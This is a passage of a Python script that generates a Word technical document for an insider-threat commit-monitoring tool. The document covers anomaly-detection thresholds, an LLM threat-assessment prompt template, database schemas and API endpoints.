    ['Baseline Status', 'Method', 'Severity'],
    [
        ['established (>=20)', 'Z-score = |hour - mean_hour| / std_hour', 'Medium if z >= 2.0, High if z >= 3.0'],
        ['partial (5-19)', 'Simple range: hour < start or hour > end', 'Low'],
        ['insufficient (<5)', 'No detection', '-'],
    ]
)

doc.add_heading('Code: Off-Hours Z-Score Detection', level=3)
add_code_block(
    '# Established baseline: z-score analysis\n'
    'hour = committed_at.hour\n'
    'mean_h = baseline["mean_commit_hour"]\n'
    'std_h = max(baseline["std_commit_hour"], 1.0)\n'
    'z = abs(hour - mean_h) / std_h\n\n'
    'if z >= 3.0:  severity = "high"\n'
    'elif z >= 2.0: severity = "medium"\n\n'
    '# Example: Developer normally commits 9-17 (mean=13, std=2)\n'
    '# Commit at 3:00 AM -> z = |3-13|/2 = 5.0 -> HIGH severity'
)

# 6.2 Large Commit
doc.add_heading('6.2 Large Commit Size', level=2)
doc.add_paragraph(
    'Flags commits where lines added or deleted exceed 5x the developer\'s baseline average. '
    'Only activates when the baseline average is > 20 lines to avoid false positives on developers '
    'who typically make small commits.'
)

add_table(
    ['Type', 'Threshold', 'Severity'],
    [
        ['large_commit_additions', 'additions > 5x avg_additions (if avg > 20)', 'High if ratio > 10x, else Medium'],
        ['large_commit_deletions', 'deletions > 5x avg_deletions (if avg > 20)', 'High if ratio > 10x, else Medium'],
    ]
)

# 6.3 Risk Spike
doc.add_heading('6.3 Risk Spike', level=2)
doc.add_paragraph(
    'Flags when a commit\'s risk score is more than 3x the developer\'s average risk score. '
    'Only triggers if the new score is >= 2.5 (meaningful risk) and baseline avg > 0.5.'
)

add_code_block(
    '# Risk spike detection\n'
    'avg_risk = baseline["avg_risk_score"]\n'
    'if avg_risk > 0.5 and risk_score >= 2.5 and risk_score > avg_risk * 3.0:\n'
    '    # ALWAYS high severity\n'
    '    anomaly: "risk_spike"\n'
    '    description: f"Risk score {risk_score} - {ratio}x above baseline ({avg_risk})"'
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 7. STAGE 5 - AI THREAT ASSESSMENT
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('7. Stage 5 - AI Threat Assessment', level=1)

doc.add_paragraph(
    'The AI threat assessment is an on-demand analysis triggered by security analysts when they want '
    'a deeper investigation of a specific commit. It uses the platform\'s configurable AI backend '
    '(any supported LLM provider) to perform intent analysis.'
)

# 7.1 Prompt Engineering
doc.add_heading('7.1 Prompt Engineering', level=2)

doc.add_heading('System Prompt', level=3)
add_code_block(
    'SYSTEM: "You are a cybersecurity expert specializing in insider threat analysis. '\
    'Respond only with valid JSON."'
)

doc.add_heading('User Prompt Template', level=3)
add_code_block(
    'You are a senior application security analyst specializing in insider threat detection.\n\n'
    'Analyze the following git commit and provide a structured threat assessment.\n\n'
    '## Commit Details\n'
    '- **Repository**: {repo_full_name}\n'
    '- **SHA**: {sha[:12]}\n'
    '- **Author**: {author_name} <{author_email}>\n'
    '- **Committer**: {committer_name} <{committer_email}>\n'
    '- **Message**: {commit_message}\n'
    '- **Committed at**: {committed_at}\n'
    '- **Risk Score**: {risk_score}/10 ({risk_level})\n'
    '- **Files changed**: {files_changed} (+{additions} / -{deletions} lines)\n\n'
    '## Behavioral Signals\n'
    '{signal_text}\n\n'
    '## SAST Findings ({count} total)\n'
    '  - [{severity}] {rule_name} in {file_path} line {line_number}\n'
    '    Code: `{matched_text[:300]}`\n'
    '    Rule: {rule_description}  CWE: {cwe}  OWASP: {owasp}\n\n'
    '## Sensitive Files Touched ({count} total)\n'
    '  - {file_path} (matched pattern: {pattern_matched})\n\n'
    '---\n'
    'Respond ONLY with a valid JSON object matching this schema:\n'
    '{\n'
    '  "threat_level": "intentional_insider"|"suspicious"|"negligent"|"false_positive",\n'
    '  "confidence": 0.0-1.0,\n'
    '  "impact_summary": "2-3 sentence description of real-world security impact",\n'
    '  "intent_analysis": "2-3 sentence analysis of intentional vs accidental",\n'
    '  "malicious_scenario": "Most likely attack scenario if malicious (null if < 0.3)",\n'
    '  "key_indicators": ["indicator 1", "indicator 2", ...],\n'
    '  "recommended_actions": ["action 1", "action 2", ...]\n'
    '}'
)

doc.add_heading('AI Configuration', level=3)
add_table(
    ['Parameter', 'Value', 'Reason'],
    [
        ['Temperature', '0.3', 'Low temperature for deterministic, consistent threat analysis'],
        ['Max Tokens', '1500', 'Sufficient for structured JSON response'],
        ['Response Format', 'JSON only', 'Enforced by system prompt + parsing with markdown fence stripping'],
        ['Provider', 'Configurable', 'Uses AIConfig.from_user() - supports multiple LLM providers'],
    ]
)

# 7.2 Threat Levels
doc.add_heading('7.2 Threat Level Classification', level=2)

add_table(
    ['Threat Level', 'Description', 'Typical Indicators'],
    [
        ['intentional_insider', 'Deliberate malicious action by authorized user', 'Secret exfiltration, backdoor injection, security control bypass'],
        ['suspicious', 'Potentially harmful, warrants investigation', 'Unusual patterns, risky changes, possible negligence or intent'],
        ['negligent', 'Unintentional security risk from poor practices', 'Hardcoded credentials, debug code in prod, missing input validation'],
        ['false_positive', 'Benign commit incorrectly flagged', 'Test files, documentation, legitimate config changes'],
    ]
)

doc.add_paragraph(
    'The AI response is stored in github_commit_ai_analysis for future reference, '
    'avoiding redundant API calls. The model used is also recorded for audit purposes.'
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 8. DEVELOPER RISK PROFILES
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('8. Developer Risk Profiles', level=1)

doc.add_paragraph(
    'The system maintains a continuous risk profile for every developer who has committed to a '
    'monitored repository. Profiles are updated incrementally with each new scan.'
)

doc.add_heading('Profile Metrics', level=2)
add_table(
    ['Metric', 'Update Logic'],
    [
        ['total_commits', 'Incremented by 1 per scan'],
        ['high_risk_commits', 'Incremented if risk_level in (high, critical)'],
        ['total_findings', 'Incremented by count of findings in this commit'],
        ['avg_risk_score', 'Rolling average across all commits'],
        ['risk_trend', 'increasing / decreasing / stable (based on recent trend)'],
        ['last_commit_at', 'Timestamp of most recent commit'],
    ]
)

doc.add_heading('Profile Update Flow', level=2)
add_code_block(
    'For each scanned commit:\n'
    '  1. Check if developer profile exists in github_developer_profiles\n'
    '  2. If not: INSERT new profile with initial stats\n'
    '  3. If yes: UPDATE incrementally:\n'
    '       total_commits += 1\n'
    '       high_risk_commits += 1 if risk_level in (high, critical)\n'
    '       total_findings += len(findings)\n'
    '       avg_risk_score = rolling average\n'
    '       last_commit_at = committed_at\n'
    '  4. Compute/update behavioral baseline (Stage 3)\n'
    '  5. Run anomaly detection (Stage 4)'
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 9. DASHBOARD & REPORTING
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('9. Dashboard & Reporting', level=1)

doc.add_paragraph(
    'The GitHub Monitor provides a comprehensive multi-tab dashboard for security teams.'
)

doc.add_heading('Dashboard Tabs', level=2)
add_table(
    ['Tab', 'Content', 'Key Features'],
    [
        ['Overview', 'Per-repo risk cards with distribution bars', 'Stacked risk distribution (critical/high/medium/low/clean), peak/avg scores, open alerts'],
        ['Commit Feed', 'Paginated commit list with risk badges', 'Filter by repo, risk level, author, date range. Expandable details with findings'],
        ['Timeline', '14-day commit risk heatmap', 'Color-coded cells showing daily activity intensity by risk level'],
        ['Developers', 'Developer risk profiles', 'Expandable cards with baseline details, anomaly history, risk trends'],
        ['Anomalies', 'All behavioral anomalies', 'Severity filter, acknowledgement workflow, linked to source commits'],
        ['Alerts', 'Sensitive file access tracking', 'Alert acknowledgement, file path and matched pattern details'],
        ['Findings', 'All SAST findings across commits', 'CWE/OWASP references, remediation guidance, CSV export'],
        ['Repos', 'Repository management', 'Add/remove repos, trigger scans, view scan history'],
    ]
)

doc.add_heading('Signal Visualization', level=2)
add_table(
    ['Signal', 'Icon', 'Color'],
    [
        ['off_hours', 'Clock', 'Blue'],
        ['author_mismatch', 'User', 'Purple'],
        ['unsigned', 'Lock Open', 'Gray'],
        ['large_deletion', 'Trash', 'Red'],
        ['force_push', 'Lightning', 'Red'],
        ['suspicious_message', 'Message', 'Yellow'],
        ['binary_files', 'Package', 'Orange'],
        ['dependency_tampering', 'DNA', 'Red'],
        ['cicd_tampering', 'Wrench', 'Red'],
        ['config_weakening', 'Shield', 'Orange'],
    ]
)

doc.add_heading('False Positive Management', level=2)
doc.add_paragraph(
    'Both individual findings and entire commits can be marked as false positives. '
    'When a commit is marked as FP, its risk level is recalculated based on the remaining '
    'non-FP findings. This allows security teams to refine results without losing data.'
)

doc.add_heading('CSV Export', level=2)
doc.add_paragraph(
    'All findings can be exported to CSV format for external reporting, compliance audits, '
    'or integration with other security tools. The export includes: severity, rule name, '
    'file path, line number, matched text, category, commit SHA, author, and timestamp.'
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 10. DATABASE SCHEMA
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('10. Database Schema', level=1)

doc.add_paragraph(
    'The GitHub Monitor uses 7 dedicated SQLite tables to store all monitoring data.'
)

# Table 1
doc.add_heading('github_monitored_repos', level=2)
add_table(
    ['Column', 'Type', 'Description'],
    [
        ['id', 'INTEGER PK', 'Auto-increment primary key'],
        ['owner', 'TEXT NOT NULL', 'GitHub org/user'],
        ['repo', 'TEXT NOT NULL', 'Repository name'],
        ['full_name', 'TEXT NOT NULL', 'owner/repo'],
        ['description', 'TEXT', 'Repo description'],
        ['default_branch', 'TEXT DEFAULT "main"', 'Branch to scan'],
        ['active', 'INTEGER DEFAULT 1', 'Monitoring enabled'],
        ['last_scanned_at', 'TEXT', 'Last scan timestamp'],
        ['total_commits_scanned', 'INTEGER DEFAULT 0', 'Cumulative scan count'],
        ['added_by', 'TEXT NOT NULL', 'User who added repo'],
        ['created_at', 'TEXT', 'Row creation time'],
    ]
)

# Table 2
doc.add_heading('github_commit_scans', level=2)
add_table(
    ['Column', 'Type', 'Description'],
    [
        ['id', 'INTEGER PK', 'Auto-increment primary key'],
        ['repo_id', 'INTEGER FK', 'References github_monitored_repos(id)'],
        ['sha', 'TEXT NOT NULL', 'Commit SHA hash'],
        ['author_name / author_email', 'TEXT', 'Commit author identity'],
        ['committer_name / committer_email', 'TEXT', 'Committer identity'],
        ['commit_message', 'TEXT', 'Full commit message'],
        ['committed_at', 'TEXT', 'Commit timestamp'],
        ['files_changed', 'INTEGER', 'Number of files'],
        ['additions / deletions', 'INTEGER', 'Line counts'],
        ['risk_score', 'REAL', 'Computed risk score (0-10)'],
        ['risk_level', 'TEXT', 'critical/high/medium/low/clean'],
        ['signals', 'TEXT (JSON)', 'Array of detected signals'],
        ['files_detail', 'TEXT (JSON)', 'Per-file stats'],
        ['false_positive', 'INTEGER', '0=normal, 1=marked as FP'],
    ]
)

# Table 3
doc.add_heading('github_commit_findings', level=2)
add_table(
    ['Column', 'Type', 'Description'],
    [
        ['id', 'INTEGER PK', 'Auto-increment primary key'],
        ['scan_id', 'INTEGER FK', 'References github_commit_scans(id)'],
        ['rule_name', 'TEXT NOT NULL', 'SAST rule name'],
        ['rule_id', 'INTEGER', 'References custom_rules(id)'],
        ['severity', 'TEXT NOT NULL', 'critical/high/medium/low'],
        ['file_path', 'TEXT', 'File containing the finding'],
        ['line_number', 'INTEGER', 'Line number in diff'],
        ['matched_text', 'TEXT', 'Matched code (truncated 200 chars)'],
        ['category', 'TEXT', 'insider_threat'],
        ['diff_snippet', 'TEXT', '+/- 5 lines context (max 1500 chars)'],
        ['false_positive', 'INTEGER', '0=normal, 1=marked as FP'],
    ]
)

# Table 4
doc.add_heading('github_sensitive_file_alerts', level=2)
add_table(
    ['Column', 'Type', 'Description'],
    [
        ['id', 'INTEGER PK', 'Auto-increment primary key'],
        ['scan_id', 'INTEGER FK', 'References github_commit_scans(id)'],
        ['file_path', 'TEXT NOT NULL', 'Path to sensitive file'],
        ['pattern_matched', 'TEXT NOT NULL', 'Regex pattern that matched'],
        ['author_email', 'TEXT', 'Commit author'],
        ['committed_at', 'TEXT', 'Commit timestamp'],
        ['acknowledged', 'INTEGER DEFAULT 0', '0=new, 1=acknowledged'],
    ]
)

# Table 5
doc.add_heading('github_developer_profiles', level=2)
add_table(
    ['Column', 'Type', 'Description'],
    [
        ['id', 'INTEGER PK', 'Auto-increment primary key'],
        ['author_email', 'TEXT UNIQUE', 'Developer identifier'],
        ['author_name', 'TEXT', 'Display name'],
        ['total_commits', 'INTEGER', 'Total commits scanned'],
        ['high_risk_commits', 'INTEGER', 'Commits with high/critical risk'],
        ['total_findings', 'INTEGER', 'Total SAST findings across commits'],
        ['risk_trend', 'TEXT', 'increasing/decreasing/stable'],
        ['last_commit_at', 'TEXT', 'Most recent commit timestamp'],
        ['avg_risk_score', 'REAL', 'Rolling average risk score'],
    ]
)

# Table 6
doc.add_heading('github_developer_baselines', level=2)
add_table(
    ['Column', 'Type', 'Description'],
    [
        ['id', 'INTEGER PK', 'Auto-increment primary key'],
        ['author_email', 'TEXT UNIQUE', 'Developer identifier'],
        ['typical_hour_start / end', 'INTEGER', 'Normal working hours (UTC)'],
        ['mean_commit_hour', 'REAL', 'Statistical mean of commit hours'],
        ['std_commit_hour', 'REAL', 'Standard deviation of commit hours'],
        ['avg_additions / deletions / files_changed', 'REAL', 'Average commit size metrics'],
        ['p90_additions / p90_deletions', 'REAL', '90th percentile size metrics'],
        ['avg_risk_score', 'REAL', 'Average historical risk'],
        ['avg_commits_per_week', 'REAL', 'Activity rate'],
        ['commit_count_used', 'INTEGER', 'Commits in baseline window'],
        ['baseline_status', 'TEXT', 'insufficient/partial/established'],
    ]
)

# Table 7
doc.add_heading('github_developer_anomalies', level=2)
add_table(
    ['Column', 'Type', 'Description'],
    [
        ['id', 'INTEGER PK', 'Auto-increment primary key'],
        ['author_email', 'TEXT NOT NULL', 'Developer identifier'],
        ['scan_id', 'INTEGER FK', 'References github_commit_scans(id)'],
        ['anomaly_type', 'TEXT NOT NULL', 'off_hours_deviation / large_commit_* / risk_spike'],
        ['description', 'TEXT NOT NULL', 'Human-readable description'],
        ['baseline_value', 'REAL', 'Expected value from baseline'],
        ['observed_value', 'REAL', 'Actual value in this commit'],
        ['severity', 'TEXT', 'low/medium/high'],
        ['acknowledged', 'INTEGER DEFAULT 0', '0=new, 1=acknowledged'],
    ]
)

# Table 8
doc.add_heading('github_commit_ai_analysis', level=2)
add_table(
    ['Column', 'Type', 'Description'],
    [
        ['id', 'INTEGER PK', 'Auto-increment primary key'],
        ['scan_id', 'INTEGER UNIQUE FK', 'References github_commit_scans(id)'],
        ['threat_level', 'TEXT NOT NULL', 'intentional_insider / suspicious / negligent / false_positive'],
        ['confidence', 'REAL', '0.0 to 1.0'],
        ['impact_summary', 'TEXT', 'Real-world security impact description'],
        ['intent_analysis', 'TEXT', 'Intent classification rationale'],
        ['malicious_scenario', 'TEXT', 'Attack scenario if malicious (nullable)'],
        ['key_indicators', 'TEXT (JSON)', 'Array of threat indicators'],
        ['recommended_actions', 'TEXT (JSON)', 'Array of recommended actions'],
        ['raw_response', 'TEXT', 'Full AI response for audit'],
        ['model_used', 'TEXT', 'AI model identifier'],
    ]
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 11. INTEGRATIONS
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('11. Integration with Other Platform Features', level=1)

doc.add_heading('Custom Rules Engine', level=2)
doc.add_paragraph(
    'The GitHub Monitor\'s SAST scanning (Stage 2, Step 4) directly uses the platform\'s Custom Rules '
    'engine. Rules with category="insider_threat" are loaded from the custom_rules table and executed '
    'against every commit diff. This means security teams can create new insider threat detection '
    'patterns that are immediately active in GitHub monitoring without any code changes.'
)

doc.add_heading('Report Service', level=2)
doc.add_paragraph(
    'The report_service.py includes _create_github_monitor_sheet() which builds an Excel sheet '
    'with GitHub monitoring data for export. This includes repository summaries, risk distributions, '
    'and developer risk rankings.'
)

doc.add_heading('AI Client Factory', level=2)
doc.add_paragraph(
    'The AI threat assessment uses the platform\'s shared AI client factory (AIConfig.from_user, '
    'get_ai_client). This means it automatically uses whatever AI provider and model the user has '
    'configured - OpenAI, Anthropic, or any other supported provider. The same AI configuration '
    'is shared across all platform features.'
)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════
# 12. FILE REFERENCE
# ═══════════════════════════════════════════════════════════════════════
doc.add_heading('12. File Reference', level=1)

add_table(
    ['File', 'Lines', 'Purpose'],
    [
        ['backend/routers/github_monitor.py', '~1,471', 'All API endpoints, background scan orchestration, AI analysis endpoint'],
        ['backend/services/github_client.py', '~150', 'Async GitHub REST API client with PAT authentication'],
        ['backend/services/commit_analyzer.py', '705', 'Multi-signal commit analysis engine with 10+ detectors'],
        ['backend/services/baseline_engine.py', '362', 'Behavioral baseline computation and anomaly detection'],
        ['frontend/src/pages/GitHubMonitorPage.tsx', '~2,121', 'Multi-tab dashboard UI with interactive visualizations'],
        ['backend/main.py (github tables)', '~185', 'Database table creation and migration definitions'],
    ]
)

doc.add_heading('API Endpoints Summary', level=2)
add_table(
    ['Endpoint', 'Method', 'Purpose'],
    [
        ['/api/github-monitor/settings', 'GET/PUT', 'Get/save GitHub PAT and org'],
        ['/api/github-monitor/settings/test', 'POST', 'Test PAT connectivity'],
        ['/api/github-monitor/repos', 'GET/POST', 'List/add monitored repos'],
        ['/api/github-monitor/repos/{id}', 'DELETE', 'Remove repo from monitoring'],
        ['/api/github-monitor/scan/{id}', 'POST', 'Trigger manual repo scan'],
        ['/api/github-monitor/scan-all', 'POST', 'Scan all active repos'],
        ['/api/github-monitor/commits', 'GET', 'Paginated commit feed with filters'],
        ['/api/github-monitor/commits/{id}', 'GET', 'Full commit details with findings'],
        ['/api/github-monitor/commits/{id}/ai-analyze', 'POST', 'Trigger AI threat assessment'],
        ['/api/github-monitor/findings', 'GET', 'All findings across commits'],
        ['/api/github-monitor/findings/export-csv', 'GET', 'CSV export of findings'],
        ['/api/github-monitor/developers', 'GET', 'All developer risk profiles'],
        ['/api/github-monitor/developers/{email}/baseline', 'GET', 'Developer behavioral baseline'],
        ['/api/github-monitor/developers/{email}/anomalies', 'GET', 'Developer anomalies'],
        ['/api/github-monitor/anomalies', 'GET', 'All anomalies (filterable)'],
        ['/api/github-monitor/alerts/sensitive-files', 'GET', 'Sensitive file alerts'],
        ['/api/github-monitor/summary', 'GET', 'Dashboard summary stats'],
        ['/api/github-monitor/timeline', 'GET', '14-day risk heatmap data'],
    ]
)

# ── Save ──
out_path = os.path.join(os.path.dirname(__file__), 'GitHub_Monitor_Insider_Threat_Detection_Technical_Document.docx')
doc.save(out_path)
print(f"Document saved to: {out_path}")
